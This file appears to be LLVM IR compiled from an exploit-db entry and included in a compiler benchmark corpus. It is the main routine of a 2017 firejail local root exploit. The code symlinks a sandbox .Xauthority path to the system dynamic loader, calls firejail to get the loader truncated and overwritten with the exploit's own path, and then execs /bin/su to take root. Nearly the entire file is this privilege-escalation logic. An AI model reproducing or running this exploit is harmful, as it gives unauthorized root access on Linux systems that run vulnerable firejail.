; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43359.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_43359.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [43 x i8] c"[*] fire(j|n)ail local root exploit 2017\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"HOME\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"[-] no $HOME\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.4 = private unnamed_addr constant [26 x i8] c"[-] Unable to find myself\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"%s/.firenail\00", align 1
@errno = common dso_local global i64 0, align 8
@EEXIST = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [10 x i8] c"[-] mkdir\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"%s/.firenail/.Xauthority\00", align 1
@ldso = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [12 x i8] c"[-] symlink\00", align 1
@.str.9 = private unnamed_addr constant [41 x i8] c"firejail --private=.firenail /usr/bin/id\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [9 x i8] c"[-] open\00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.12 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@__const.main.su = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.12, i32 0, i32 0), i8* null], align 16
@.str.13 = private unnamed_addr constant [14 x i8] c"[-] execve su\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i8*, align 8
  %4 = alloca [256 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca [2 x i8*], align 16
  store i32 0, i32* %1, align 4
  %7 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %8 = bitcast [4096 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 4096, i1 false)
  %9 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i8* %9, i8** %3, align 8
  %10 = load i8*, i8** %3, align 8
  %11 = icmp ne i8* %10, null
  br i1 %11, label %14, label %12

12:                                               ; preds = %0
  %13 = call i32 @die(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  br label %14

14:                                               ; preds = %12, %0
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %16 = call i64 @readlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i8* %15, i32 4095)
  %17 = icmp slt i64 %16, 0
  br i1 %17, label %18, label %20

18:                                               ; preds = %14
  %19 = call i32 @die(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.4, i64 0, i64 0))
  br label %20

20:                                               ; preds = %18, %14
  %21 = bitcast [256 x i8]* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %21, i8 0, i64 256, i1 false)
  %22 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %23 = load i8*, i8** %3, align 8
  %24 = call i32 @snprintf(i8* %22, i32 255, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i8* %23)
  %25 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %26 = call i64 @mkdir(i8* %25, i32 448)
  %27 = icmp slt i64 %26, 0
  br i1 %27, label %28, label %34

28:                                               ; preds = %20
  %29 = load i64, i64* @errno, align 8
  %30 = load i64, i64* @EEXIST, align 8
  %31 = icmp ne i64 %29, %30
  br i1 %31, label %32, label %34

32:                                               ; preds = %28
  %33 = call i32 @die(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %28, %20
  %35 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %36 = load i8*, i8** %3, align 8
  %37 = call i32 @snprintf(i8* %35, i32 255, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0), i8* %36)
  %38 = load i32, i32* @ldso, align 4
  %39 = getelementptr inbounds [256 x i8], [256 x i8]* %4, i64 0, i64 0
  %40 = call i64 @symlink(i32 %38, i8* %39)
  %41 = icmp slt i64 %40, 0
  br i1 %41, label %42, label %48

42:                                               ; preds = %34
  %43 = load i64, i64* @errno, align 8
  %44 = load i64, i64* @EEXIST, align 8
  %45 = icmp ne i64 %43, %44
  br i1 %45, label %46, label %48

46:                                               ; preds = %42
  %47 = call i32 @die(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.8, i64 0, i64 0))
  br label %48

48:                                               ; preds = %46, %42, %34
  %49 = call i32 @system(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.9, i64 0, i64 0))
  %50 = load i32, i32* @ldso, align 4
  %51 = load i32, i32* @O_RDWR, align 4
  %52 = load i32, i32* @O_TRUNC, align 4
  %53 = or i32 %51, %52
  %54 = call i32 @open(i32 %50, i32 %53)
  store i32 %54, i32* %5, align 4
  %55 = load i32, i32* %5, align 4
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %59

57:                                               ; preds = %48
  %58 = call i32 @die(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.10, i64 0, i64 0))
  br label %59

59:                                               ; preds = %57, %48
  %60 = load i32, i32* %5, align 4
  %61 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %62 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %63 = call i32 @strlen(i8* %62)
  %64 = call i32 @write(i32 %60, i8* %61, i32 %63)
  %65 = load i32, i32* %5, align 4
  %66 = call i32 @write(i32 %65, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0), i32 1)
  %67 = load i32, i32* %5, align 4
  %68 = call i32 @close(i32 %67)
  %69 = bitcast [2 x i8*]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %69, i8* align 16 bitcast ([2 x i8*]* @__const.main.su to i8*), i64 16, i1 false)
  %70 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %71 = load i8*, i8** %70, align 16
  %72 = getelementptr inbounds [2 x i8*], [2 x i8*]* %6, i64 0, i64 0
  %73 = call i32 @execve(i8* %71, i8** %72, i32* null)
  %74 = call i32 @die(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.13, i64 0, i64 0))
  ret i32 -1
}

declare dso_local i32 @printf(i8*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #2

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @die(i8*) #1

declare dso_local i64 @readlink(i8*, i8*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i64 @mkdir(i8*, i32) #1

declare dso_local i64 @symlink(i32, i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @open(i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @execve(i8*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
